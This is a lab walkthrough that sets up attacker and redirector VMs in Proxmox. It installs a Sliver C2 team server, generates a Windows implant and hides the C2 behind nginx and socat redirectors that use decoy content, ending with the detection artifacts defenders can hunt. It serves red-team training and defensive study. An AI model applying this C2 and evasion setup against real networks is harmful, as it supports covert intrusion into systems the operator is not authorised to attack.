# Attacker and redirector VMs (VLANs 150 and 160)

For each VM below, create it in Proxmox and set the NIC to the VLAN aware bridge with the VLAN tag in the NIC's VLAN Tag field.

---
##  Kali operator, VLAN 150

- Create VM, attach Kali ISO, NIC tag:150, vCPU:1 socket-4 cores, RAM:8 GB, Storage:60 GB.
- Install, then confirm it pulls a 172.23.150.x lease from pfSense.
- Add a DHCP reservation (Part 1) at 172.23.150.10.

---

##  Ubuntu plus Sliver C2, VLAN 150

- Create VM, attach Ubuntu Server ISO, NIC tag:150, vCPU:1 socket-2 cores, RAM:4 GB, Storage:40 GB.
- Install, then confirm it pulls a 172.23.150.x lease from pfSense.
- Add a DHCP reservation (Part 1) at 172.23.150.20.

The official one line installer (curl https://sliver.sh/install | sudo bash) does not reliably produce both the server and client binaries on every system, confirmed by installing that silently ended up with only the client. Download both binaries directly from the official GitHub releases instead, which also avoids relying on a version-pinned link:

```bash
sudo curl -L https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux-amd64 \
  -o /usr/local/bin/sliver-server
  
sudo curl -L https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux-amd64 \
  -o /usr/local/bin/sliver-client
  
sudo chmod +x /usr/local/bin/sliver-server /usr/local/bin/sliver-client
```

Confirm both files landed correctly, roughly 260 MB for the server and 38 MB for the client:

```bash
ls -la /usr/local/bin/sliver-server /usr/local/bin/sliver-client

sliver-server version
sliver-client version
```

Unpack: This downloads the Go toolchain and implant build templates the server needs to actually compile payloads:

```bash
sliver-server unpack --force
```

Run the server as a persistent systemd service so it survives you disconnecting:

```bash
sudo tee /etc/systemd/system/sliver.service << 'EOF'
[Unit]
Description=Sliver C2 Server
After=network.target

[Service]
ExecStart=/usr/local/bin/sliver-server daemon
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now sliver

sudo systemctl status sliver --no-pager
```

Confirm active running and not failed or looping.

Generate your operator config from a true root shell, not a sudo prefix (this matters).   
Plain sudo on Ubuntu does not reset HOME to /root by default, but the systemd service above runs with User=root, which does get HOME=/root automatically.  
Generating the operator config under your own HOME while the daemon runs under a different one creates two separate, mismatched sets of certificates and the client will fail to connect with a generic timeout that gives no hint the real cause is a certificate mismatch.   
Avoid this by using a real root shell for this one step:

```bash
sudo -i
sliver-server operator --name <your-username> --lhost 127.0.0.1 --permissions all --save /tmp/operator.cfg
cp /tmp/operator.cfg /home/<your-username>/operator.cfg
chown <your-username>:<your-username> /home/<your-username>/operator.cfg
exit
```

Back as your normal user, import and connect:

```bash
sliver-client import /home/<your-username>/operator.cfg
sliver-client
```

You should land in a  sliver > prompt. Everything from here on, listeners, implant generation, session interaction happens as your normal user through this console, no root needed again.   
Authentication and authorization run through the operator certificate you imported, independent of your OS login.  
This keep daily account unprivileged and let the tool's own credential system do the gatekeeping, the same separation real red team infrastructure maintains.

This server stays on VLAN 150, behind the redirectors and is the real team server referenced throughout Part 3.

##  Ubuntu HTTP/S redirector, VLAN 160

- Create VM, attach Ubuntu Server ISO, NIC tag:160, vCPU:1 socket-2 cores, RAM:2 GB, Storage:20 GB.
- Role: nginx reverse proxy forwarding inbound HTTP/S from the GOAD lab to the Sliver HTTPS listener on VLAN 150, with a filtering and decoy layer.
- Reservation at 10.60.160.10.

## 3.4 Ubuntu DNS/SSH redirector, VLAN 160

- Create VM, attach Ubuntu Server ISO, NIC tag:160, vCPU:1 socket-2 cores, RAM:2 GB, Storage:20 GB.
- Role: DNS redirection (nginx stream or socat) and SSH pivot toward VLAN 150. 
- Reservation at 10.60.160.20.

## 3.5 Validate the network before GOAD setup

From Kali (VLAN 150): Confirm you can reach the redirectors (VLAN 160) and vice versa per policy. Also check that Kali cannot reach your "Real LAN".  
From your desktop (VLAN 100): Confirm RDP/SSH to Kali works. Fix any pfSense rule issues now while the topology is simple.

---

# Redirector configuration

#### What a redirector is and why it exists

 In real engagements the team server is expensive to lose. Burning it means rebuilding infrastructure and re-establishing every session. A redirector is a cheap, disposable box that sits in front of the team server. Implants talk to the redirector and the redirector forwards only legitimate C2 traffic to the hidden team server and serves benign looking content to everyone else.

**Why this matters defensively.** Everything below is what a blue team learns to fingerprint, the header rewriting, the conditional forwarding by URI or User Agent, the difference between a real web server's response and a redirector's decoy.   
In this lab everything stays on RFC1918 VLANs, there are no public domains and the pfSense rules from Part 1 already prevent anything reaching the internet.

Reference addresses used below, adjust to your reservations:
- Sliver team server (VLAN 150): 172.23.150.20
- HTTP/S redirector (VLAN 160): 10.60.160.10
- DNS/SSH redirector (VLAN 160): 10.60.160.20
- Implants run on the GOAD hosts (VLAN 56) and call back to the redirector IP, never directly to the team server.

## Sliver side, start the listener

Connect to your running Sliver daemon and start the listener the redirector will forward to. Sliver does not depend on the TLS layer for its security so self-signed is fine for training.

```bash
# From the Sliver box, as your normal operator account
sliver-client

# HTTPS listener that the HTTP/S redirector will forward to
sliver > https --lhost 0.0.0.0 --lport 8443
```

Confirm it actually started:

```bash
sliver > jobs
```

This should list the HTTPS job active on port 8443. This is the check to run before assuming the listener exists. It is suggested you don't skip it as an unconfirmed listener produces confusing redirector test results later, that look like a routing problem when the real issue is nothing was listening at all.

The HTTPS listener binds to 8443 not 443, so the redirector owns the public looking 443 and forwards inward to 8443. A DNS listener for the second redirector is covered in following steps.

## HTTP/S redirector, nginx reverse proxy (VLAN 160)

### Install

```bash
# on 10.60.160.10
sudo apt update && sudo apt install -y nginx openssl
```

### Generate a self-signed cert

```bash
sudo mkdir -p /etc/nginx/ssl
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout /etc/nginx/ssl/redirector.key \
  -out /etc/nginx/ssl/redirector.crt \
  -subj "/CN=updates.lab.local"
```

CN=updates.lab.local is an arbitrary lab hostname. In a real engagement this is where a convincing decoy domain would go.

### The redirector config

Create /etc/nginx/sites-available/c2redirector:

```nginx
upstream sliver_teamserver {
    server 172.23.150.20:8443;
}

server {
    listen 80;
    server_name updates.lab.local;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl;
    server_name updates.lab.local;

    ssl_certificate     /etc/nginx/ssl/redirector.crt;
    ssl_certificate_key /etc/nginx/ssl/redirector.key;

    location /api/v1/ {
        proxy_pass https://sliver_teamserver;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_hide_header X-Powered-By;
        proxy_intercept_errors on;
    }

    location / {
        root /var/www/decoy;
        index index.html;
        try_files $uri $uri/ =404;
    }
}
```

### Create the decoy site

```bash
sudo mkdir -p /var/www/decoy
echo '<!doctype html><title>Welcome</title><h1>This is a legitimate website.</h1>' \
  | sudo tee /var/www/decoy/index.html
```

An analyst or automated scanner hitting the redirector's root sees a bland landing page, not your C2. Only requests to /api/v1/ get proxied inward.

### Enable and test

```bash
sudo ln -s /etc/nginx/sites-available/c2redirector /etc/nginx/sites-enabled/
sudo rm -f /etc/nginx/sites-enabled/default
sudo nginx -t
sudo systemctl restart nginx
```

### Point the implant at the redirector

```bash
sliver > generate --http updates.lab.local --os windows
```

### Validate before moving on

Confirmed working from an actual build. From Kali test both paths:

```bash
curl -k https://10.60.160.10/
```
This returns the plain decoy page, the bland landing content and not anything C2 related.

```bash
curl -k https://10.60.160.10/api/v1
```
This behaves differently from the web root. In this case returning a 301 rather than the decoy content, confirming the request reached through to Sliver rather than falling through to the decoy location block. This 301 is expected, Sliver's own HTTP(S) listener is built to serve a decoy response to any request that is not one of its own generated implant URLs. This kind of anti-fingerprinting behavior is one of Sliver's advertised features.   
A curl to an arbitrary path like /api/v1 will never look like a real implant callback to Sliver itself, so getting some non-decoy, non-404 response back is the actual confirmation the proxy chain works end to end.

Confirm from the redirector's access log that requests are landing where expected:

```bash
sudo tail -5 /var/log/nginx/access.log
```

Real output from a working setup:
```
172.23.150.10 - - [20/Sep/2026:14:56:55 +0000] "GET / HTTP/1.1" 200 56 "-" "curl/8.21.0"
172.23.150.10 - - [20/Sep/2026:14:57:08 +0000] "GET /api/v1 HTTP/1.1" 301 178 "-" "curl/8.21.0"
```
The source IP shown is Kali's, on the operator VLAN, confirming both requests actually transited from VLAN 150 through the redirector on VLAN 160. This is the path the firewall rules are built to allow.

## DNS/SSH redirector (VLAN 160)

There are two options for this as nginx is an HTTP/S proxy by default. It does not redirect DNS or raw SSH out of the box. That needs either nginx separate stream module or a dedicated tool such as socat. This second box handles both fallback channels and we have a choice for the DNS part, covered below.

### Option A, DNS redirection with nginx's stream module

nginx's stream module proxies raw TCP and UDP, separate from the http module we already used for the HTTP/S redirector. On Ubuntu it ships inside the standard nginx package as a module. Check if exists first since some minimal installs may not include it:

```bash
nginx -V 2>&1 | grep -o with-stream
```

If that prints nothing, install the full package:

```bash
sudo apt install -y nginx-full
```

The stream block is a top level directive. Add it in `/etc/nginx/nginx.conf`, outside the existing `http { }` block:

```nginx
stream {
    upstream sliver_dns {
        server 172.23.150.20:5353;
    }
    server {
        listen 53 udp;
        proxy_pass sliver_dns;
        proxy_timeout 3s;
        proxy_responses 1;
    }
}
```

What each line is actually doing: `listen 53 udp` binds the standard DNS port in UDP mode since DNS queries are UDP by default. `proxy_pass sliver_dns` forwards every packet arriving on that port to the Sliver DNS listener defined above. `proxy_timeout 3s` bounds how long nginx waits for a reply before giving up on that exchange. DNS is expected to be fast, so we keep this short. `proxy_responses 1` tells nginx to expect exactly one UDP reply packet per query and close that stream immediately after which matches normal DNS behavior and avoids nginx holding sockets open, waiting for more traffic.

Test the config and reload:

```bash
sudo nginx -t
sudo systemctl restart nginx
```

Verify it is actually listening:

```bash
sudo ss -ulnp | grep :53
```

### Option B, DNS redirection with socat instead

socat is a general purpose relay tool, simpler for a single fixed forward than nginx's stream module and worth knowing independently of nginx, since you will likely reach for it again for other pivoting tasks.

```bash
sudo apt install -y socat
```

Command:

```bash
sudo socat UDP4-RECVFROM:53,fork UDP4-SENDTO:172.23.150.20:5353
```

Breaking down : `UDP4-RECVFROM:53` opens a UDP socket on port 53 and waits to receive a datagram. `fork` is critical, without it socat handles exactly one packet and then exits, `fork` makes it spawn a new handler for each incoming datagram so it keeps running and can service multiple queries. `UDP4-SENDTO:172.23.150.20:5353` is the destination side, every packet received gets forwarded to Sliver's DNS listener at that address and port.

Make it a persistent systemd service as running this directly in a terminal dies the moment you disconnect:

```bash
sudo tee /etc/systemd/system/dns-redirect.service << 'EOF'
[Unit]
Description=DNS redirect to Sliver via socat
After=network.target

[Service]
ExecStart=/usr/bin/socat UDP4-RECVFROM:53,fork UDP4-SENDTO:172.23.150.20:5353
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now dns-redirect
sudo systemctl status dns-redirect --no-pager
```

Confirm active running.

Pick one of Option A or B, not both as they will fight over the same port 53. The nginx stream approach keeps everything in one already-familiar tool if you built the HTTP/S redirector the same way, socat is lighter weight and worth knowing on its own since it generalizes to any TCP or UDP relay.

### SSH redirection or pivot

We can have two different patterns here, not redundant with each other.

**SSH ProxyJump** for the operator, reaching the team server console through this box without the team server needing to be directly reachable from your operator VLAN:

```bash
ssh -J user@10.60.160.20 user@172.23.150.20
```

`-J` tells your local SSH client to first connect to the jump host 10.60.160.20, then tunnel a second SSH connection through that first one to the real destination, 172.23.150.20. There is no need for any special configuration on redirector for this to work as it is a client side feature of SSH itself. The redirector just needs sshd running normally.

**Or** we can forward one specific port instead of a full login session. This is useful if you need local access to a service running on the team server rather than a shell on it:

```bash
ssh -L 31337:172.23.150.20:31337 user@10.60.160.20
```

This opens the local port 31337 on your own machine, tunneled through the redirector and landing on the port 31337 of the team server.

**socat TCP relay**, is also a different pattern. This makes the redirector itself continuously forward a port rather than relying on your SSH client's jump feature each time:

```bash
sudo socat TCP4-LISTEN:2222,fork,reuseaddr TCP4:172.23.150.20:22
```

`TCP4-LISTEN:2222` opens a listening socket on port 2222 of the redirector. `fork` again means it services multiple simultaneous connections rather than dying after one. `reuseaddr` lets the socket be reopened quickly if the service restarts, without waiting on the OS to release the port from a previous run. `TCP4:172.23.150.20:22` is the forwarding target, the team server's real SSH port.  
Anyone connecting to the redirector on 2222 transparently lands on the team server's SSH, without needing SSH's own ProxyJump feature client side.

Make this persistent the same way as the DNS redirect if you want it always available:

```bash
sudo tee /etc/systemd/system/ssh-redirect.service << 'EOF'
[Unit]
Description=SSH redirect to team server via socat
After=network.target

[Service]
ExecStart=/usr/bin/socat TCP4-LISTEN:2222,fork,reuseaddr TCP4:172.23.150.20:22
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now ssh-redirect
```

The pattern to actually use depends on what you are doing. ProxyJump needs nothing extra on the redirector and is the cleanest choice for your own interactive access, since it is entirely client driven.  
The socat relay is what you would reach for if something other than an SSH client needs to reach the team server's port through this box or if you want the forward to exist independent of any particular operator's SSH config.

## What to observe

While the redirector runs observe these, since they are the detection artifacts.

- `sudo tail -f /var/log/nginx/access.log` on the redirector. See how C2 requests to /api/v1/ differ from decoy hits.
- Compare the TLS cert your redirector presents against a real service. Self-signed, odd CN, short validity are all fingerprints.
- Note how the X-Forwarded-For header exposes the original client to the upstream. Blue teams pull exactly these headers from proxy logs to unwrap a redirect chain.

Every OPSEC choice above maps to a detection opportunity you now know how to hunt or avoid.

---
